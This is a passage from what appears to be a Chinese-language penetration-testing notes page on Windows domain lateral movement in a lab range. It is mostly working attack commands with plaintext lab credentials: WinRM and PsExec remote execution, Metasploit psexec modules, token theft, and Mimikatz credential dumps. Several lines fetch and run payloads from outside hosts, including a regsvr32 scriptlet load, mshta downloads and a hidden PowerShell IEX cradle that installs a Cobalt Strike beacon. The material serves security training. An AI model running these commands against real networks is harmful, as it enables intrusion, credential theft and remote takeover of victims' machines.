/node:10.10.10.201 /user:administrator /password:1qaz@WSX3e process call create &quot;regsvr32 /s /n /u /i:http://192.168.78.117:8080/feY7nzY.sct scrobj.dll&quot;</span><br><span class="line"></span><br><span class="line">regsvr32 是com组件注册的一个命令。</span><br><span class="line">msf可以生成sct的文件，再通过远程加载sct，即可上线</span><br></pre></td></tr></table></figure><h3 id="msf利用wmic"><a href="#msf利用wmic" class="headerlink" title="msf利用wmic"></a>msf利用wmic</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/local/wmi) &gt; options</span><br><span class="line">使用该模块，提供账户密码，就可以通过wmic执行命令~~~</span><br><span class="line">需要注意防火墙</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208220052488.png" alt="image-20220822005215206"></p><h2 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h2><h3 id="WinRM简介"><a href="#WinRM简介" class="headerlink" title="WinRM简介"></a>WinRM简介</h3><p>WinRM 指的是Windows远程管理服务，通过<strong>远程连接winRM模块可以操作windows命令行</strong>，默认监听端口5985（HTTP）和5986 (HTTPS)，在2012及以后默认开启。低于此版本要手动开启（靶场的PC机器和web机器都没有开启，需要手动开启）</p><h3 id="开启WinRM"><a href="#开启WinRM" class="headerlink" title="开启WinRM"></a>开启WinRM</h3><ul><li>判断本机是否开启WinRM服务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm enumerate winrm/config/listener</span><br><span class="line">下图表示没有开启</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208131908850.png" alt="image-20220813190855609" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano | findstr 5985</span><br><span class="line">wmic service list brief | findstr WinRM</span><br></pre></td></tr></table></figure><ul><li>判断目标主机是否开启WinRM服务</li></ul><p>查看远程主机是否开启WinRM服务：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ServerScan.exe -h 10.10.10.30 -p 5985,5986</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081315752.png" alt="image-20220808131520618"></p><ul><li>查看远程WinRM服务是否正常：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test-wsman 10.10.10.30</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081315465.png" alt="image-20220808131537317"></p><ul><li>命令开启WinRM服务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm quickconfig</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081316922.png" alt="image-20220808131617740" style="zoom: 50%;" /><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081316137.png" alt="image-20220808131639012"></p><ul><li>允许远程主机访问及访问远程主机（即开启允许外连）</li></ul><p>WinRM只允许当前域用户或者处于本机TrustedHosts列表中的远程主机进行访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm set winrm/config/client @&#123;TrustedHosts=&quot;*&quot;&#125;</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081317247.png" alt="image-20220808131705064" style="zoom:50%;" /><h3 id="Winrs执行命令"><a href="#Winrs执行命令" class="headerlink" title="Winrs执行命令"></a>Winrs执行命令</h3><p>winrs内置命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrs -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e ipconfig</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrs -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e &quot;cmd.exe&quot;</span><br></pre></td></tr></table></figure><h3 id="WinRM横向移动"><a href="#WinRM横向移动" class="headerlink" title="WinRM横向移动"></a>WinRM横向移动</h3><ul><li>利用winrm参数选项中的invoke参数，来对目标对象执行特定的方法。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm invoke create wmicimv2/win32_process @&#123;Commandline=&quot;calc.exe&quot;&#125;</span><br></pre></td></tr></table></figure><p>命令调用了Windows WMI中Win32_process类的Create方法，生成了一个calc.exe的新进程</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081318509.png" alt="image-20220808131818326" style="zoom:50%;" /><ul><li>在远程机器上打开进程</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm invoke create wmicimv2/win32_process @&#123;Commandline=&quot;calc.exe&quot;&#125; -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e</span><br></pre></td></tr></table></figure><ul><li>在远程机器上创建服务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm invoke Create wmicimv2/Win32_Service @&#123;Name=&quot;test&quot;;DisplayName=&quot;test&quot;;PathName=&quot;cmd.exe /k c:\59.exe&quot;&#125; -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e</span><br><span class="line"></span><br><span class="line">调用Win32_Service类</span><br></pre></td></tr></table></figure><ul><li>在远程机器上启动服务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm invoke StartService wmicimv2/Win32_Service?Name=test -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081319710.png" alt="image-20220808131946534" style="zoom:50%;" /><h1 id="横向移动-外部工具篇"><a href="#横向移动-外部工具篇" class="headerlink" title="横向移动-外部工具篇"></a>横向移动-外部工具篇</h1><h2 id="Smbexec、Psexec"><a href="#Smbexec、Psexec" class="headerlink" title="Smbexec、Psexec"></a>Smbexec、Psexec</h2><h3 id="Psexec简介"><a href="#Psexec简介" class="headerlink" title="Psexec简介"></a>Psexec简介</h3><p>PsExec是一种轻巧的telnet替代品，可让您在其他系统上<strong>执行进程，并为控制台应用程序提供完整的交互性，而无需手动安装客户端软件</strong>。</p><blockquote><p>在”H:\ATTACK\权限提升\SysinternalsSuite\PsExec.exe”目录中有</p><p>psexec下载地址：<br><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</a><br>impacket下载地址：<br>py：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a><br>exe：<a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p><p>impacket相较于微软官方的sysinternalsuits更好用</p></blockquote><h3 id="Psexec原理"><a href="#Psexec原理" class="headerlink" title="Psexec原理"></a>Psexec原理</h3><ol><li>ipc$ 连接,释放 Psexesvc.exe（即将服务程序复制到目标主机上）</li><li>通过服务管理 OpenSCManager 打开受害者机器上服务控制管理器的句柄（也就是打开服务控制管理器）</li><li>通过 CreateService 创建服务</li><li>获取服务句柄 OpenService 使用 StartService 启动服务</li></ol><h3 id="Psexec使用前提"><a href="#Psexec使用前提" class="headerlink" title="Psexec使用前提"></a>Psexec使用前提</h3><ol><li>对方主机开启了 admin$  共享，如果关闭了 admin$ 共享，会提示：找不到网络名</li><li>对方未开启防火墙</li><li>如果是工作组环境，则必须使用 administrator 用户连接（因为要在目标主机上面创建并启动服务），使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问。</li><li>如果是域环境，即可用普通域用户连接也可以用域管理员用户连接。连接普通域主机可以用普通域用户，连接域控只能用域管理员账户。</li></ol><h3 id="PsExec-exe使用"><a href="#PsExec-exe使用" class="headerlink" title="PsExec.exe使用"></a>PsExec.exe使用</h3><p>微软官方工具包</p><ul><li>直接使用</li></ul><blockquote><ul><li><p>第一次运行会弹框,输入 –accepteula 这个参数就可以绕过</p></li><li><p>如果出现找不到网络名，判断目标主机已禁用ADMIN$共享</p></li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\PsExec.exe \\192.168.10.201 -u de1ay\Administrator -p 1qaz@WSX3e -s cmd.exe -accepteula</span><br></pre></td></tr></table></figure><ul><li>建立IPC连接，无需输入密码</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\IP /u:域名称\域账号 密码</span><br><span class="line">反弹cmd：</span><br><span class="line">psexec.exe \\10.10.10.201 -s cmd.exe -accepteula</span><br><span class="line">执行命令：</span><br><span class="line">psexec.exe \\10.10.10.201 whoami -accepteula</span><br></pre></td></tr></table></figure><ul><li>重要参数</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-c &lt;[路径]文件名&gt;:拷贝文件到远程机器并运行（注意：运行结束后文件会自动删除）</span><br><span class="line">-d 不等待程序执行完就返回</span><br><span class="line">比如想上传一个本地的getpass到你远程连接的服务器上去运行（很方便）:</span><br><span class="line">Psexec.exe \\ip -u user -p pass -c c:\getpass.exe –d</span><br></pre></td></tr></table></figure><ul><li>Cobaltstrike</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell psexec.exe \\10.10.10.201 -u de1ay\Administrator -p 1qaz@WSX3e whoami</span><br><span class="line">beacon&gt; shell psexec.exe \\10.10.10.201 -u de1ay\Administrator -p 1qaz@WSX3e mshta http://192.168.78.117:8088/download/file.ext</span><br></pre></td></tr></table></figure><p>psexec 传递命令时不要添加双引号否则会爆 “系统找不到指定的文件” 的错误。</p><h3 id="Psexec-py"><a href="#Psexec-py" class="headerlink" title="Psexec.py"></a>Psexec.py</h3><p>impacket套件中的Psexec与官方psexec.exe相比会自动删除服务，增加隐蔽性</p><ul><li>交互式命令行</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt;psexec.py de1ay/administrator:1qaz@WSX3e@10.10.10.201</span><br><span class="line"></span><br><span class="line">Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies</span><br><span class="line">[*] Requesting shares on 10.10.10.201.....请求文件共享</span><br><span class="line">[*] Found writable share ADMIN$找到一个可写的文件共享</span><br><span class="line">[*] Uploading file DabwFVJj.exe</span><br><span class="line">[*] Opening SVCManager on 10.10.10.201.....</span><br><span class="line">[*] Creating service KNri on 10.10.10.201.....</span><br><span class="line">[*] Starting service KNri.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;exit退出会会自动清理文件</span><br><span class="line">[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0</span><br><span class="line">[*] Opening SVCManager on 10.10.10.201.....</span><br><span class="line">[*] Stoping service KNri.....</span><br><span class="line">[*] Removing service KNri.....</span><br><span class="line">[*] Removing file DabwFVJj.exe.....</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081329748.png" alt="image-20220808132958587" style="zoom:33%;" /><ul><li>直接执行命令</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt;psexec.exe de1ay/administrator:1qaz@WSX3e@10.10.10.201 whoami</span><br><span class="line">Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies</span><br><span class="line">[*] Requesting shares on 10.10.10.201.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file SLZVAxLl.exe</span><br><span class="line">[*] Opening SVCManager on 10.10.10.201.....</span><br><span class="line">[*] Creating service slqx on 10.10.10.201.....</span><br><span class="line">[*] Starting service slqx.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">nt authority\system</span><br><span class="line">[*] Process whoami finished with ErrorCode: 0, ReturnCode: 0</span><br><span class="line">[*] Opening SVCManager on 10.10.10.201.....</span><br><span class="line">[*] Stoping service slqx.....</span><br><span class="line">[*] Removing service slqx.....</span><br><span class="line">[*] Removing file SLZVAxLl.exe.....</span><br></pre></td></tr></table></figure><ul><li>Cobaltstrike</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell c:\psexec.exe administrator:1qaz@WSX@10.10.10.201 whoami</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell c:\psexec.exe administrator:1qaz@WSX@10.10.10.201 mshta http://192.168.78.104:80/download/file.ext</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081331667.png" alt="image-20220808133147513" style="zoom:50%;" /><h3 id="Smbexec-py"><a href="#Smbexec-py" class="headerlink" title="Smbexec.py"></a>Smbexec.py</h3><p>impacket套件中smbexec是一款基于psexec的域渗透测试工具，并配套samba工具。<br>445端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt;smbexec.py de1ay/administrator:1qaz@WSX3e@10.10.10.201</span><br><span class="line">Impacket v0.9.17 - Copyright 2019 SecureAuth Corporation</span><br><span class="line">[!] Launching semi-interactive shell - Careful what you execute</span><br></pre></td></tr></table></figure><h2 id="Wmiexec"><a href="#Wmiexec" class="headerlink" title="Wmiexec"></a>Wmiexec</h2><h3 id="Wmiexec-vbs"><a href="#Wmiexec-vbs" class="headerlink" title="Wmiexec.vbs"></a>Wmiexec.vbs</h3><p>基本原理：当用户输入命令时，WMI创建进程执行该命令，然后把结果输出到文件，这个文件位于之前创建的共享文件夹。最后，通过FSO组件访问远程共享文件夹（需要用到445端口）中的结果文件，将结果输出。当结果读取完成时，调用WMI执行命令删除结果文件。最后当WMIEXEC退出时，删除文件共享。</p><ol><li>单命令执行</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cscript.exe wmiexec.vbs /cmd ip username password &quot;command&quot;</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081342452.png" alt="image-20220808134239306" style="zoom:50%;" /><ol start="2"><li>半交互模式</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell cscript.exe //nologo c:\wmiexec.vbs /shell ip username password</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081343522.png" alt="image-20220808134319303" style="zoom:50%;" /><ol start="3"><li>注意</li></ol><p>wmi只是创建进程,没办法去判断一个进程是否执行完成(比如ping),这样就导致wmi.dll删除不成,下一次又是被占用,这时候修改一下vbs里面的名字就好：Const FileName &#x3D; “wmi1.dll”,也可以加入-persist参数(后台运行)</p><p>非域用户登陆到win08和2012中,只有administrator可以登陆成功,其他管理员账号会出现 WMIEXEC ERROR: Access is denied</p><h3 id="WMI-HACKER"><a href="#WMI-HACKER" class="headerlink" title="WMI-HACKER"></a>WMI-HACKER</h3><p>介绍：免杀横向渗透远程命令执行，常见的WMIEXEC、PSEXEC执行命令是创建服务或调用Win32_Process.create执行命令，这些方式都已经被杀软100%拦截，通过改造出WMIHACKER免杀横向移动测试工具。此工具通过135端口进行命令执行，读取执行结果以及进行文件传输时无需445端口，通过把执行结果写入注册表中，然后进行读取。</p><p>主要功能：1、命令执行；2、文件上传；3、文件下载<br>使用：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cscript //nologo WMIHACKER_0.6.vbs</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有命令回显执行方式</span><br><span class="line">&gt; cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator &quot;Password!&quot; &quot;systeminfo&quot; 1</span><br><span class="line">无命令回显</span><br><span class="line">&gt; cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator &quot;Password!&quot; &quot;systeminfo &gt; c:\1.txt&quot; 0</span><br><span class="line">模拟shell模式</span><br><span class="line">&gt; cscript WMIHACKER_0.6.vbs /shell 172.16.94.187 administrator &quot;Password!&quot;</span><br><span class="line">文件上传-复制本机calc.exe到远程主机c:\calc.exe</span><br><span class="line">&gt; cscript wmihacker_0.4.vbe /upload 172.16.94.187 administrator &quot;Password!&quot; &quot;c:\windows\system32\calc.exe&quot; &quot;c:\calc&quot;</span><br><span class="line">文件下载-下载远程主机calc.exe到本地c:\calc.exe</span><br><span class="line">&gt; cscript wmihacker_0.4.vbe /download 172.16.94.187 administrator &quot;Password!&quot; &quot;c:\calc&quot; &quot;c:\windows\system32\calc.exe&quot;</span><br></pre></td></tr></table></figure><blockquote><p>360-Linton-Lab&#x2F;WMIHACKER(连接 上GitHub上康康)</p></blockquote><h3 id="wmicmd-exe"><a href="#wmicmd-exe" class="headerlink" title="wmicmd.exe"></a>wmicmd.exe</h3><p>wmicmd命令回显（工作组）</p><blockquote><p><a href="https://github.com/nccgroup/WMIcmd">https://github.com/nccgroup/WMIcmd</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WMIcmd.exe -h 10.10.10.201 -u administrator -p 1qaz@WSX -d . -c &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure><h3 id="Wmiexec-py"><a href="#Wmiexec-py" class="headerlink" title="Wmiexec.py"></a>Wmiexec.py</h3><p>Impacket套件<br>原理就是把数据先存到一个临时文件中，在每次读取完执行结果后就自动删除。可以用来回显执行命令<br>的结果和获取半交互式的shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python wmiexec.py -share admin$ administrator:1qaz@WSX@10.10.10.201</span><br></pre></td></tr></table></figure><h2 id="pth-winexe"><a href="#pth-winexe" class="headerlink" title="pth-winexe"></a>pth-winexe</h2><p>Kali自带pth工具集</p><ul><li>工作组</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pth-winexe -U administrator%1qaz@WSX3e --system --ostype=1 //10.10.10.201 command</span><br></pre></td></tr></table></figure><ul><li>域</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pth-winexe  -U de1ay/administrator%Aatest --system --ostype=1 //192.168.3.90 command</span><br></pre></td></tr></table></figure><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><h3 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h3><p>和前面的psexec工具类似，该工具集成到msf之中，注意哈，msf5中的下面某些模块在msf6中是没有用了的~~工具嘛，失效了就换下一个~ 何必单恋一支花-</p><p>这种psexec就是利用账号密码，登录后再执行命令~~~</p><p><del><code>auxiliary/admin/smb/ms17_010_command</code>在msf6模块也是有用的</del>，出了点问题</p><ul><li>执行<strong>单个命令</strong>的PTH模块</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auxiliary/admin/smb/psexec_command</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/admin/smb/psexec_command</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; options</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set command whoami</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set RHOSTS 10.10.10.201</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set SMBDomain de1ay</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set SMBUser administrator</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set SMBPass 1qaz@WSX3e</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; run</span><br></pre></td></tr></table></figure><ul><li>执行直接就<strong>获取到meterpreter</strong>的PTH模块(有用)</li></ul><p>对域内知晓密码的机器进行攻击~~此刻的目标是DC</p><p>需要注意的是：</p><p>我们此时攻击的目标是内网机器，我们无法直接访问到，需要搭建代理，并且建立正向连接访问代理，再对内网的DC机器进行攻击！这一点是很重要的~~</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exploit/windows/smb/psexec</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set RHOSTS 10.10.10.201</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set SMBDomain de1ay</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbuser administrator</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbpass 1qaz@WSX3e</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; run</span><br><span class="line"></span><br><span class="line">另外不要忘记添加代理，添加完代理后，msf会自动帮我们转发相应的请求</span><br><span class="line">#设置正向payload，建立正向连接</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt;set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">#添加路由</span><br><span class="line">run autoroute -s 10.10.10.0/24    添加到10.10.10.0网段的路由</span><br><span class="line">run autoroute -p    查看添加的路由</span><br><span class="line">#搭建socks代理</span><br><span class="line">search socks</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">show options</span><br><span class="line">exploit –j </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exploit/windows/smb/psexec_psh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/smb/psexec_psh</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; set RHOSTS 10.10.10.201</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; set SMBDomain de1ay</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; set smbuser administrator</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; set smbpass 1qaz@WSX3e</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; run</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auxiliary/admin/smb/ms17_010_command</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081421408.png" alt="image-20220808142121175" style="zoom:50%;" /><h3 id="Token窃取"><a href="#Token窃取" class="headerlink" title="Token窃取"></a>Token窃取</h3><ul><li>Token简介</li></ul><p>Windows有两种类型的Token：</p><ul><li><blockquote><p>Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)</p></blockquote></li><li><blockquote><p>Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)</p></blockquote></li></ul><p>两种token只在系统重启后清除</p><blockquote><p>具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效</p></blockquote><p>这也就意味着 当主机上某台主机登录过，那么可能会遗留下相应的token，我们窃取之就可以以其身份登录~~~</p><p>可以通过此方法提权至域管用户，当然得要域管遗留下来这个token</p><ul><li>Metasploit</li></ul><blockquote><p>在Metasploit中，可使用incognito实现token窃取，Metasploit中的incognito，是从windows平台下的incognito移植过来的</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">加载incognito模块：</span><br><span class="line">load incognito</span><br><span class="line">列举token：</span><br><span class="line">list_tokens -u</span><br><span class="line">查看当前token：</span><br><span class="line">getuid</span><br><span class="line">提示至system权限：</span><br><span class="line">getsystem</span><br><span class="line">token窃取：</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br><span class="line">从进程窃取token：</span><br><span class="line">steal_token 4500</span><br><span class="line">返回之前token：</span><br><span class="line">rev2self、drop_token</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081427321.png" alt="image-20220808142725127" style="zoom:50%;" /><h2 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h2><p>首先通过powershell脚本上线：(记得关闭杀软)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://124.223.217.243:1232/a1&#x27;))&quot;</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208202251708.png" alt="image-20220820225108246" style="zoom:50%;" /><h3 id="凭证获取"><a href="#凭证获取" class="headerlink" title="凭证获取"></a>凭证获取</h3><p>beacon执行内置mimikatz的命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashdump</span><br><span class="line">logonpasswords</span><br></pre></td></tr></table></figure><h3 id="扫描存活主机"><a href="#扫描存活主机" class="headerlink" title="扫描存活主机"></a>扫描存活主机</h3><p>PortScan扫描存活主机，随便选几个端口，先探测存活再去扫描端口，可以探测存活主机 。beacon会不断返回探测结果</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210024828.png" alt="image-20220821002431586" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210024245.png" alt="image-20220821002459084" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210028081.png" alt="image-20220821002824888" style="zoom:50%;" /></p><p>点击这个靶状的图标显示具体信息</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210029381.png" alt="image-20220821002907220" style="zoom:50%;" /><h3 id="Psexec-1"><a href="#Psexec-1" class="headerlink" title="Psexec"></a>Psexec</h3><p>使用psexec就可以使用我们之前获取下来的账户密码 尝试登录这些机器了！！我们尝试移动到DC。在内网需要建立SMB监听（内网一台主机监听DC，我们的消息从smb传到WEB再传到我们VPS</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210045294.png" alt="image-20220821004545125" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210039528.png" alt="image-20220821003902374" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210041658.png" alt="image-20220821004108900" style="zoom:50%;" /></p><p>其中session选项就是，通过我们在内网拿下的主机，凭借此建立的session进行跳转~~</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210042915.png" alt="image-20220821004223743"></p><p>成功拿到DC,以WEB机器为跳板机，跳至DC</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210043074.png" alt="image-20220821004340903" style="zoom:50%;" /><p>注意到SMB使用的payload是正向的管道连接~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210049564.png" alt="image-20220821004910411" style="zoom:50%;" /><h3 id="Psexec-psh"><a href="#Psexec-psh" class="headerlink" title="Psexec_psh"></a>Psexec_psh</h3><blockquote><p>Psexec_psh hash传递</p></blockquote><h3 id="WinRM-1"><a href="#WinRM-1" class="headerlink" title="WinRM"></a>WinRM</h3><h3 id="Token窃取-1"><a href="#Token窃取-1" class="headerlink" title="Token窃取"></a>Token窃取</h3><p>steal token：只要用户登陆过就有对应token残留，我们就可以窃取~（只要没有关机）</p><p>另外：Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效（上面有讲）</p><p>可以对比下面的登录状态和注销状态的情况。并要注意到，msf自动集成了token窃取的工具，但是cs没有，需要我们手动上传。可使用incognito实现token窃取，Metasploit中的incognito，是从windows平台下的incognito移植过来的</p><blockquote><p>de1ay\administrator登录状态</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081430453.png" alt="image-20220808143054224" style="zoom:50%;" /><blockquote><p>de1ay\administrator注销状态</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081431488.png" alt="image-20220808143124291" style="zoom:50%;" /><h2 id="SharpRDP"><a href="#SharpRDP" class="headerlink" title="SharpRDP"></a>SharpRDP</h2><blockquote><p>一个.NET控制台应用程序工具，可用于对横向目标执行针对远程目标<strong>的经过身份验证</strong>的命令执行。<br>用于经过身份验证的命令执行的远程桌面协议控制台应用程序</p></blockquote><h3 id="原理详解"><a href="#原理详解" class="headerlink" title="原理详解"></a>原理详解</h3><blockquote><p>再谈远程桌面横向移动<br>项目地址：<a href="https://github.com/0xthirteen/SharpRDP">0xthirteen&#x2F;SharpRDP</a></p></blockquote><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Regular RDP connection and execution</span><br><span class="line">常规RDP连接和执行</span><br><span class="line">SharpRDP.exe computername=target.domain command=&quot;C:\Temp\file.exe&quot; </span><br><span class="line">username=domain\user password=password</span><br><span class="line"></span><br><span class="line">Exec program as child process of cmd or powershell</span><br><span class="line">执行程序作为cmd或powershell的子进程</span><br><span class="line">SharpRDP.exe computername=target.domain command=&quot;C:\Temp\file.exe&quot; </span><br><span class="line">username=domain\user password=password exec=cmd</span><br><span class="line">Use restricted admin mode</span><br><span class="line">使用受限管理模式</span><br><span class="line">SharpRDP.exe computername=target.domain command=&quot;C:\Temp\file.exe&quot;</span><br><span class="line">Connect first host drives</span><br><span class="line">连接第一个主机驱动器</span><br><span class="line">SharpRDP.exe computername=domain.target command=&quot;\\tsclient\C\Temp\file.exe&quot; </span><br><span class="line">username=domain\user password=password connectdrive=true</span><br><span class="line">Execute command elevated through Run Dialog - CURRENTLY BUGGED</span><br><span class="line">执行通过运行对话框提升的命令-当前已安装</span><br><span class="line">SharpRDP.exe computername=domain.target command=&quot;C:\Temp\file.exe&quot; </span><br><span class="line">username=domain\user password=password elevated=winr</span><br><span class="line">Execute command elevated through task manager</span><br><span 